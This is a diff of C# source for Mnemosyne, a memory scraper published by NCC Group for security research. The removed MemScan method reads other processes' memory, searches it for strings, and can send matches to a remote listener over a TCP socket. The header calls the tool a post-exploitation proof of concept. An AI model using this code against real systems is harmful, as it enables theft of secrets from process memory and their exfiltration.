@@ -1,10 +1,30 @@
+/*
+Released as open source by NCC Group Plc - http://www.nccgroup.com/
+
+Developed by Matt Lewis, matt dot lewis at nccgroup dot trust
+
+https://github.com/nccgroup/mnemosyne
+
+Released under AGPL see LICENSE for more information
+
+Mnemosyne - A Memory Scraper
+
+Written by Matt Lewis, NCC Group 2017
+Synopsis - scans a process memory space for a search string (unicode and ascii)
+then if found, spits these out either to stdout, a file or a socket to a remote listener
+
+Useful for memory scraping a process, a post-exploitation POC, an analysis mechanism for malware  or 
+an instrumentation tool to be used during fuzzing
+
+Code adapted from http://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory
+Original code licensed under CPOL: http://www.codeproject.com/info/cpol10.aspx
+*/
+
 using System;
 using System.Diagnostics;
-using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Text.RegularExpressions;
 using MemoryScanner.Resources;
 
 namespace MemoryScanner
@@ -12,14 +32,14 @@ namespace MemoryScanner
     internal class ProgObj
     {
         // REQUIRED CONSTS
-        private const int ProcessQueryInformation = 0x0400;
+        internal const int ProcessQueryInformation = 0x0400;
 
-        private const int MemCommit = 0x00001000;
-        private const int PageReadwrite = 0x04;
-        private const int ProcessWmRead = 0x0010;
+        internal const int MemCommit = 0x00001000;
+        internal const int PageReadwrite = 0x04;
+        internal const int ProcessWmRead = 0x0010;
 
-        private const string ArgSocket = "socket";
-        private const string ArgFile = "file";
+        internal const string ArgSocket = "socket";
+        internal const string ArgFile = "file";
         private const string ArgStandardInputOutput = "stdio";
 
         // REQUIRED METHODS
@@ -30,10 +50,10 @@ namespace MemoryScanner
         public static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
 
         [DllImport("kernel32.dll")]
-        private static extern void GetSystemInfo(out SystemInfo lpSystemInfo);
+        internal static extern void GetSystemInfo(out SystemInfo lpSystemInfo);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MemoryBasicInformation lpBuffer, uint dwLength);
+        internal static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MemoryBasicInformation lpBuffer, uint dwLength);
 
         // REQUIRED STRUCTS
         public struct MemoryBasicInformation
@@ -97,7 +117,7 @@ namespace MemoryScanner
 
             // Validate arguments, if good then off we go!
             if (myargs.IsArgumentValid())
-                MemScan(myargs);
+                MemScan.ScanMemory(myargs);
             else
                 Console.WriteLine(ErrorStrings.ArgumentError);
 
@@ -166,210 +186,6 @@ namespace MemoryScanner
             
             // enter sandman
             System.Threading.Thread.Sleep(delay);
-        }
-
-        public static void MemScan(CliArgs myargs)
-        {
-            Socket sender = null;
-            System.IO.StreamWriter file = null;
-
-            // Writing output to socket.
-            if (myargs.Mode.Equals(ArgSocket))
-            {
-                try
-                {
-                    var ipAddress = IPAddress.Parse(myargs.Ipaddr);
-                    var remoteIp = new IPEndPoint(ipAddress, myargs.Portnum);
-
-                    sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    sender.Connect(remoteIp);
-                    Console.WriteLine(MessageStrings.SearchStartMessageForStandardIO, sender.RemoteEndPoint);
-                }
-                catch (SocketException se)
-                {
-                    Console.WriteLine("SocketException : {0}", se);
-                }
-            }
-
-            // Writing output to file.
-            if (myargs.Mode.Equals(ArgFile))
-                file = new System.IO.StreamWriter(myargs.Filename);
-
-            // Get all running processes.
-            Process[] localAll = Process.GetProcesses();
-
-            // If we're not proc-hopping, just fill the array with the same PID of our target.
-            // A bit of a fudge but avoids lots of duplicate code otherwise...
-            if (!myargs.ProcHop)
-            {
-                for (int i = 0; i < localAll.Length; i++)
-                    localAll[i] = Process.GetProcessById(myargs.Pid);
-            }
-
-            while (true)
-            {
-                foreach (Process process in localAll)
-                {
-                    // Getting minimum & maximum address.
-                    SystemInfo sysInfo = new SystemInfo();
-                    GetSystemInfo(out sysInfo);
-
-                    IntPtr procMinAddress = sysInfo.MinimumApplicationAddress;
-                    IntPtr procMaxAddress = sysInfo.MaximumApplicationAddress;
-
-                    // Saving the values as long ints to avoid lot of casts later.
-                    long procMinAddressL = (long)procMinAddress;
-                    long procMaxAddressL = (long)procMaxAddress;
-
-                    string toSend = "";
-
-                    // Opening the process with desired access level.
-                    IntPtr processHandle = OpenProcess(ProcessQueryInformation | ProcessWmRead, false, process.Id);
-
-                    // We don't want to scrape our own process and if we can't get a handle then it's probalby a protected process.
-                    // So don't try and scan it otherwise Mnemosyne will stall.
-                    if (process.Id == Process.GetCurrentProcess().Id || processHandle == IntPtr.Zero) continue;
-
-                    Console.WriteLine("Working on processID {0} : {1}", process.Id, process.ProcessName);
-
-                    // This will store any information we get from VirtualQueryEx().
-                    MemoryBasicInformation memBasicInfo = new MemoryBasicInformation();
-
-                    // Number of bytes read with ReadProcessMemory.
-                    int bytesRead = 0;
-
-                    // For some efficiencies, pre-compute prepostfix values.
-                    int postfix = myargs.Searchterm.Length + (myargs.Prepostfix * 2);
-
-                    while (procMinAddressL < procMaxAddressL)
-                    {
-                        // 28 = sizeof(MEMORY_BASIC_INFORMATION)
-                        VirtualQueryEx(processHandle, procMinAddress, out memBasicInfo, 28);
-
-                        // If this memory chunk is accessible.
-                        if (memBasicInfo.Protect == PageReadwrite && memBasicInfo.State == MemCommit)
-                        {
-                            byte[] buffer = new byte[memBasicInfo.RegionSize];
-
-                            // Read everything in the buffer above.
-                            ReadProcessMemory((int)processHandle, memBasicInfo.BaseAddress, buffer, memBasicInfo.RegionSize, ref bytesRead);
-
-                            string memStringAscii = Encoding.ASCII.GetString(buffer);
-                            string memStringUnicode = Encoding.Unicode.GetString(buffer);
-
-                            if (myargs.IsRegex)
-                            {
-                                Regex rgx = new Regex(myargs.Searchterm, RegexOptions.IgnoreCase);
-
-                                // Does the regex pattern exist in this chunk in ASCII form?
-                                if (rgx.IsMatch(memStringAscii))
-                                {
-                                    int idex = 0;
-                                    while (rgx.Match(memStringAscii, idex).Success)
-                                    {
-                                        idex = rgx.Match(memStringAscii, idex).Index;
-                                        try
-                                        {
-                                            toSend += process.ProcessName + ":" + process.Id + ":0x" + (memBasicInfo.BaseAddress + idex) + ":A:" + memStringAscii.Substring(idex - myargs.Prepostfix, postfix) + "\n";
-                                            OutputString(myargs.Mode, toSend, myargs.Delay, sender, file);
-                                        }
-                                        // If our width is too large then it may exceed a search chunk and be out of bounds.
-                                        catch (ArgumentOutOfRangeException)
-                                        {
-                                            Console.WriteLine(ErrorStrings.OutOfBoundsError);
-                                        }
-
-                                        toSend = "";
-                                        idex++;
-                                    }
-                                }
-
-                                // Does the regex pattern exist in this chunk in UNICODE form?
-                                if (rgx.IsMatch(memStringUnicode))
-                                {
-                                    int idex = 0;
-                                    while (rgx.Match(memStringUnicode, idex).Success)
-                                    {
-                                        idex = rgx.Match(memStringUnicode, idex).Index;
-                                        try
-                                        {
-                                            toSend += process.ProcessName + ":" + process.Id + ":0x" + (memBasicInfo.BaseAddress + idex) + ":U:" + memStringUnicode.Substring(idex - myargs.Prepostfix, postfix) + "\n";
-                                            OutputString(myargs.Mode, toSend, myargs.Delay, sender, file);
-                                        }
-                                        catch (ArgumentOutOfRangeException)
-                                        {
-                                            Console.WriteLine(ErrorStrings.OutOfBoundsError);
-                                        }
-
-                                        toSend = "";
-                                        idex++;
-                                    }
-                                }
-                            }
-
-                            // Does the search terms exist in this chunk in ASCII form?
-                            if (memStringAscii.Contains(myargs.Searchterm))
-                            {
-                                int idex = 0;
-                                while ((idex = memStringAscii.IndexOf(myargs.Searchterm, idex, StringComparison.Ordinal)) != -1)
-                                {
-                                    try
-                                    {
-                                        toSend += process.ProcessName + ":" + process.Id + ":0x" + (memBasicInfo.BaseAddress + idex) + ":A:" + memStringAscii.Substring(idex - myargs.Prepostfix, postfix) + "\n";
-                                        OutputString(myargs.Mode, toSend, myargs.Delay, sender, file);
-                                    }
-                                    catch (ArgumentOutOfRangeException)
-                                    {
-                                        Console.WriteLine(ErrorStrings.OutOfBoundsError);
-                                    }
-
-                                    toSend = "";
-                                    idex++;
-                                }
-
-                            }
-
-                            // Does the search terms exist in this chunk in UNICODE form?
-                            if (memStringUnicode.Contains(myargs.Searchterm))
-                            {
-                                int idex = 0;
-                                while ((idex = memStringUnicode.IndexOf(myargs.Searchterm, idex, StringComparison.Ordinal)) != -1)
-                                {
-                                    try
-                                    {
-                                        toSend += process.ProcessName + ":" + process.Id + ":0x" + (memBasicInfo.BaseAddress + idex) + ":U:" + memStringUnicode.Substring(idex - myargs.Prepostfix, postfix) + "\n";
-                                        OutputString(myargs.Mode, toSend, myargs.Delay, sender, file);
-                                    }
-                                    catch(ArgumentOutOfRangeException)
-                                    {
-                                        Console.WriteLine(ErrorStrings.OutOfBoundsError);
-                                    }
-
-                                    toSend = "";
-                                    idex++;
-                                }
-
-                            }
-
-                        }
-
-                        // Truffle shuffle - moving on chunk.
-                        procMinAddressL += memBasicInfo.RegionSize;
-                        procMinAddress = new IntPtr(procMinAddressL);
-
-                    }
-                }
-            }
-
-            // ask Turing if we'll ever get here...
-/*
-            sender.Shutdown(SocketShutdown.Both);
-            sender.Close();
-            if (myargs.Mode.Equals("file"))
-            {
-                file.Close();
-            }
-*/
         }
     }
 }
